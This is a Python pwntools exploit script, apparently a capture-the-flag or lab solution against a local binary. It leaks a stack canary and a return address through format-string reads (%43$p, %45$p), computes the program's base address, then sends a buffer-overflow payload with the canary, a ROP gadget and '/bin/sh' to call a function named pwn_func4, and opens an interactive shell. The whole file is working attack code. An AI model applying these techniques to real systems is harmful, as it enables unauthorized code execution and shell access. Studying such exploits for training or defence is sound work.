#!/usr/bin/env python3

import re
import sys
import pwn

exe = sys.argv[1]

with open("/dev/null") as err:
  io = pwn.process(exe,stderr=err)
    
  cmd = b'prints %43$p'
  print(f"SEND >> {cmd}")
  io.sendline(cmd)
  io.recvuntil(b'Enter command: ')
  io.send(b'exec\n')
  out1 = io.recvuntil(b'\n')
  print(f">> RECV1 {out1}")
  m = re.match(rb'.*0x(?P<canary>[a-f0-9]+)', out1)
  if m is None :
    raise RuntimeError(f"failed regex")
  canary_str = m.groupdict()["canary"]
  print(f"CANARY: {canary_str}")
  canary_int= int(canary_str.decode('ascii'), 16)
  print(f"CANARY: {canary_int}")
  print(b"CANARY BYTES " + pwn.p64(canary_int))
  
  #LEAK ADRDRESS
  cmd = b'prints %45$p'
  print(f"SEND >> {cmd}")
  io.sendline(cmd)
  io.recvuntil(b'Enter command: ')
  io.send(b'exec\n')
  out1 = io.recvuntil(b'\n')
  print(f">> RECV1 {out1}")
  m = re.match(rb'.*0x(?P<retadr>[a-f0-9]+)', out1)
  if m is None :
    raise RuntimeError(f"failed regex")
  retadr_str = m.groupdict()["retadr"]
  print(f"ret str: {retadr_str}")
  retadr_int= int(retadr_str.decode('ascii'), 16)
  print(f"ret adr int: {hex(retadr_int)}")


  #COMPUTE ADR
  exec_instructions = retadr_int - 264
  elf = pwn.ELF(exe)
  raw_exec_instructions = elf.symbols['exec_instructions']
  base_addr = exec_instructions - raw_exec_instructions
  print(f"base addr: {hex(base_addr)}")
  elf.address = base_addr
    
  pwnfunc4 = elf.symbols['pwn_func4']
  pwn.context.clear(arch='x86_64')
  rop = pwn.ROP(elf)

  rdi = rop.rdi
  
  payload = (b'prints '
             + (b'\xff' * 264)
             + pwn.p64(canary_int) 
             + (b'\0' * 8)
             + pwn.p64(rdi.address)
             + b'/bin/sh$'
             + pwn.p64(pwnfunc4) + b'\n'
             + b"exec"
            )
  print(f"SEND >> {payload}")
  io.sendline(payload)
  print(io.recv())
  io.interactive()

